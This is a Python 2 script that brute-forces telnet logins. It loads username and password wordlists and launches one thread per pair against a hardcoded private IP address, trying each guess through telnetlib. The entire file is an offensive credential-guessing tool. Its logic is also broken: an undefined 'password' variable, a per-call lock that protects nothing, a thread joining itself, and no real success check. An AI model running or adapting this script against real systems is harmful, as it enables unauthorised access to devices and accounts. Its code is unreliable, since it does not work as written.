import threading
import time
import random
import sys
import telnetlib
from copy import copy
server="192.168.237.66"
passwordlist="../dict/telnet_pass.dic"
userlist="../dict/telnet_user.dic"
#open wordlist file
try:
	users=open(userlist,'r').readlines()
except(IOError):
	print "[-]Error:wordlist path wrong!"
	sys.exit(1)

#open passwordlist file
try:
	words=open(passwordlist,'r').readlines()
except(IOError):
	print "[-]Error:passwordlist path wrong!"
	sys.exit(1)

wordlist=copy(words)
print wordlist
def reloader():
	for word in wordlist:
		words.append(word)

def getword():
	lock=threading.Lock()
	lock.acquire()
	if len(words)!=0:
		value=random.sample(words,1)
		words.remove(value[0])
	else:
		print '\n Reloading Wordlist '
		reloader()
		value=random.sample(words,1)
		users.remove(users[0])
	lock.release()
	if len(users)==1:
		return value[0][:-1],users[0]
	else:
		return value[0][:-1],users[0][:-1]

class Worker(threading.Thread):
	def run(self):
		value,user=getword()
		print value+' +'+user
		try:
			print "Go"
			tn=telnetlib.Telnet(server)
			tn.read_until("Username: ")
			tn.write(user+"\n")
			if password:
				print 'wrong'
				tn.read_until("Password: ")
				tn.write(value + "\n")
			tn.write("enable\n")
			tn.write("exit\n")
			print tn.read_all()
			print "SSSSSS"
			tn.close()
			work.join()
			sys.exit(2)
		except:
			pass

for i in range(len(words)*len(users)):
	work=Worker()
	work.start()

	#time.sleep(0.5)



